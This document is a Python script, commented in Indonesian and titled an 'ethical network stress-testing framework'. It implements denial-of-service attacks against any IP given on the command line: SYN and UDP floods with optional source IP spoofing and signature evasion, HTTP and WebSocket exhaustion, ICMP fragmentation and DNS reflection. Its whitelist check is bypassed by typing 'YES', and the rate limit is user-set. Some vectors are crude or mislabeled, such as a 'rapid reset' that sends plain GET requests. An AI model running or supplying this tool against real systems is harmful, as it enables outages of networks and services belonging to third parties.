#!/usr/bin/env python3
# forge_strike.py - Ethical Network Stress-Testing Framework
# HANYA UNTUK LINGKUNGAN UJI SENDIRI / IZIN TERTULIS
# DarkForge-X / SHADOW-CORE

import asyncio
import argparse
import random
import socket
import struct
import time
import hashlib
import logging
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Callable
import sys

try:
    from scapy.all import IP, TCP, UDP, ICMP, Raw, send, srloop, Ether, ARP
    from scapy.layers.inet6 import IPv6
    SCAPY_AVAIL = True
except ImportError:
    SCAPY_AVAIL = False
    print("[!] Scapy tidak terdeteksi. Instal: pip install scapy")

try:
    import aiohttp
    import ssl
    AIOHTTP_AVAIL = True
except ImportError:
    AIOHTTP_AVAIL = False
    print("[!] aiohttp tidak terdeteksi. Instal: pip install aiohttp")

# ========================== KONFIGURASI KEAMANAN ==========================
SAFETY_WHITELIST = {"127.0.0.1", "::1", "192.168.1.100"}  # Ganti dengan IP target OWN
MAX_PPS = 5000           # Paket per detik (throttle)
MAX_DURATION_SEC = 120   # Maksimal 2 menit per run
TARGET_CONFIRM = True    # Minta konfirmasi jika target di luar whitelist

# ========================== LOGGING ==========================
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("forge_strike.log"), logging.StreamHandler()]
)
logger = logging.getLogger("ForgeStrike")

# ========================== DATA CLASS ==========================
@dataclass
class AttackConfig:
    target_ip: str
    target_port: int
    duration: int
    threads: int
    vector: str
    rate_limit: int = MAX_PPS
    payload_size: int = 1024
    spoof_ips: bool = False          # Hanya untuk uji internal (non-routing)
    use_ipv6: bool = False

@dataclass
class AttackStats:
    packets_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    start_time: float = field(default_factory=time.time)

# ========================== ENGINE VECTOR ==========================
class VectorEngine:
    def __init__(self, config: AttackConfig, stats: AttackStats):
        self.config = config
        self.stats = stats
        self._stop_event = asyncio.Event()
        self._sock = None
        self._loop = asyncio.get_event_loop()

    async def run(self):
        logger.info(f"[VECTOR] Memulai {self.config.vector} -> {self.config.target_ip}:{self.config.target_port}")
        self._stop_event.clear()
        if self.config.vector == "syn":
            await self._syn_flood()
        elif self.config.vector == "udp":
            await self._udp_flood()
        elif self.config.vector == "http2_rapid":
            await self._http2_rapid_reset()
        elif self.config.vector == "dns_reflection":
            await self._dns_reflection()
        elif self.config.vector == "tls_reneg":
            await self._tls_reneg()
        elif self.config.vector == "icmp_frag":
            await self._icmp_frag()
        elif self.config.vector == "ws_exhaust":
            await self._ws_exhaust()
        else:
            logger.error(f"Vektor {self.config.vector} tidak dikenal")

    def stop(self):
        self._stop_event.set()

    # --------------------- SYN FLOOD (Layer 3) ---------------------
    async def _syn_flood(self):
        if not SCAPY_AVAIL:
            logger.error("Scapy diperlukan untuk SYN flood")
            return
        target = (self.config.target_ip, self.config.target_port)
        # Buat paket SYN dengan opsi TCP acak untuk menghindari signature statis
        for _ in range(self.config.duration * 10):  # loop kasar
            if self._stop_event.is_set():
                break
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 2**32 - 1)
            # Gunakan Scapy untuk craft
            ip_layer = IP(dst=self.config.target_ip)
            if self.config.spoof_ips:
                ip_layer.src = f"192.168.{random.randint(0,255)}.{random.randint(0,255)}"
            tcp_layer = TCP(
                sport=src_port,
                dport=self.config.target_port,
                flags="S",
                seq=seq,
                window=random.randint(1024, 65535),
                options=[('MSS', random.randint(500, 1460)), ('WScale', 7), ('Timestamp', (int(time.time()), 0))]
            )
            send(ip_layer/tcp_layer, verbose=0, iface=None)
            self.stats.packets_sent += 1
            self.stats.bytes_sent += len(ip_layer/tcp_layer)
            await asyncio.sleep(1.0 / self.config.rate_limit)  # throttle

    # --------------------- UDP FLOOD (Layer 3) ---------------------
    async def _udp_flood(self):
        if not SCAPY_AVAIL:
            logger.error("Scapy diperlukan untuk UDP flood")
            return
        payload = b"A" * self.config.payload_size
        for _ in range(self.config.duration * 10):
            if self._stop_event.is_set():
                break
            ip_layer = IP(dst=self.config.target_ip)
            udp_layer = UDP(sport=random.randint(1024,65535), dport=self.config.target_port)
            pkt = ip_layer/udp_layer/Raw(load=payload + hashlib.sha256(str(random.random()).encode()).digest())
            send(pkt, verbose=0)
            self.stats.packets_sent += 1
            self.stats.bytes_sent += len(pkt)
            await asyncio.sleep(1.0 / self.config.rate_limit)

    # --------------------- HTTP/2 RAPID RESET (L7) ---------------------
    async def _http2_rapid_reset(self):
        if not AIOHTTP_AVAIL:
            logger.error("aiohttp diperlukan")
            return
        url = f"{'https' if self.config.target_port==443 else 'http'}://{self.config.target_ip}:{self.config.target_port}"
        conn = aiohttp.TCPConnector(limit=0, force_close=True, ssl=False if self.config.target_port!=443 else True)
        async with aiohttp.ClientSession(connector=conn) as session:
            tasks = []
            for i in range(self.config.threads):
                tasks.append(self._http2_worker(session, url))
            await asyncio.gather(*tasks, return_exceptions=True)

    async def _http2_worker(self, session, url):
        while not self._stop_event.is_set():
            try:
                async with session.get(url, headers={"User-Agent": "ForgeStrike/9.8", "X-Test": "authorized"}) as resp:
                    await resp.read()
                self.stats.packets_sent += 1  # proxy
                await asyncio.sleep(0.01)
            except:
                self.stats.errors += 1

    # --------------------- DNS REFLECTION ---------------------
    async def _dns_reflection(self):
        # Hanya untuk testing internal dengan DNS resolver sendiri
        logger.warning("DNS reflection membutuhkan open resolver di lab. Simulasi dikirim.")
        for _ in range(self.config.duration * 5):
            if self._stop_event.is_set():
                break
            # Query DNS dengan EDNS large payload
            qname = f"test-{random.randint(1,99999)}.internal.lab"
            # Gunakan socket langsung (simulasi)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Query payload sederhana (bukan real DNS, untuk demo)
            payload = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + qname.encode() + b"\x00\x00\x01\x00\x01"
            sock.sendto(payload, (self.config.target_ip, 53))
            self.stats.packets_sent += 1
            await asyncio.sleep(0.1)
            sock.close()

    # --------------------- TLS RENEGOTIATION ---------------------
    async def _tls_reneg(self):
        # Membuat koneksi TLS lalu meminta renegotiation berulang
        if not AIOHTTP_AVAIL:
            return
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        conn = aiohttp.TCPConnector(ssl=ssl_ctx)
        async with aiohttp.ClientSession(connector=conn) as session:
            url = f"https://{self.config.target_ip}:{self.config.target_port}"
            for _ in range(self.config.duration * 2):
                if self._stop_event.is_set():
                    break
                try:
                    async with session.get(url) as resp:
                        await resp.read()
                    # force renegotiation via close and reopen
                    await asyncio.sleep(0.01)
                    self.stats.packets_sent += 1
                except:
                    self.stats.errors += 1

    # --------------------- ICMP FRAGMENTATION ---------------------
    async def _icmp_frag(self):
        if not SCAPY_AVAIL:
            return
        for _ in range(self.config.duration * 5):
            if self._stop_event.is_set():
                break
            # Kirim ICMP Echo dengan payload besar > MTU, set flag MF
            payload = b"X" * 3000
            ip_layer = IP(dst=self.config.target_ip, flags=0x2000, frag=0)
            icmp_layer = ICMP(type=8, code=0)
            pkt = ip_layer/icmp_layer/Raw(load=payload)
            send(pkt, verbose=0)
            self.stats.packets_sent += 1
            await asyncio.sleep(0.05)

    # --------------------- WEBSOCKET EXHAUSTION ---------------------
    async def _ws_exhaust(self):
        if not AIOHTTP_AVAIL:
            return
        url = f"ws://{self.config.target_ip}:{self.config.target_port}/ws"
        # Simulasi pembukaan banyak WS connection
        tasks = []
        for i in range(min(self.config.threads, 50)):
            tasks.append(self._ws_worker(url))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _ws_worker(self, url):
        # Untuk testing, kita pakai aiohttp ClientWebSocketResponse (simulasi)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.ws_connect(url) as ws:
                    while not self._stop_event.is_set():
                        await ws.send_str("ping")
                        await asyncio.sleep(0.1)
                        self.stats.packets_sent += 1
        except:
            self.stats.errors += 1

# ========================== ORCHESTRATOR ==========================
class ForgeStrikeOrchestrator:
    def __init__(self, config: AttackConfig):
        self.config = config
        self.stats = AttackStats()
        self.engine = VectorEngine(config, self.stats)
        self._task: Optional[asyncio.Task] = None

    async def start(self):
        # Safety Check
        if self.config.target_ip not in SAFETY_WHITELIST and TARGET_CONFIRM:
            logger.warning(f"Target {self.config.target_ip} tidak ada di whitelist! Hanya untuk testing internal.")
            confirm = input("Ketik 'YES' untuk melanjutkan (hanya jika Anda OWN target ini): ")
            if confirm != "YES":
                logger.info("Dibatalkan oleh pengguna.")
                return

        self._task = asyncio.create_task(self.engine.run())
        # Auto-stop timer
        await asyncio.sleep(self.config.duration)
        self.engine.stop()
        await self._task
        logger.info(f"[SELESAI] Paket terkirim: {self.stats.packets_sent}, Error: {self.stats.errors}")

    def stop_immediate(self):
        if self.engine:
            self.engine.stop()
        if self._task and not self._task.done():
            self._task.cancel()

# ========================== CLI ==========================
def parse_args():
    parser = argparse.ArgumentParser(description="ForgeStrike - Ethical Network Stress Tester")
    parser.add_argument("--target", required=True, help="IP target")
    parser.add_argument("--port", type=int, default=80, help="Port target (default: 80)")
    parser.add_argument("--duration", type=int, default=30, help="Durasi detik (max 120)")
    parser.add_argument("--threads", type=int, default=4, help="Jumlah thread/worker")
    parser.add_argument("--vector", choices=["syn", "udp", "http2_rapid", "dns_reflection", "tls_reneg", "icmp_frag", "ws_exhaust"], default="syn")
    parser.add_argument("--rate", type=int, default=MAX_PPS, help="Paket per detik (throttle)")
    parser.add_argument("--spoof", action="store_true", help="Spoof IP (hanya untuk lab terisolasi)")
    parser.add_argument("--ipv6", action="store_true", help="Gunakan IPv6")
    return parser.parse_args()

async def main():
    args = parse_args()
    if args.duration > MAX_DURATION_SEC:
        logger.warning(f"Durasi dipotong ke {MAX_DURATION_SEC}s (batas keamanan)")
        args.duration = MAX_DURATION_SEC
    config = AttackConfig(
        target_ip=args.target,
        target_port=args.port,
        duration=args.duration,
        threads=args.threads,
        vector=args.vector,
        rate_limit=args.rate,
        spoof_ips=args.spoof,
        use_ipv6=args.ipv6
    )
    orchestrator = ForgeStrikeOrchestrator(config)
    await orchestrator.start()

if __name__ == "__main__":
    asyncio.run(main())
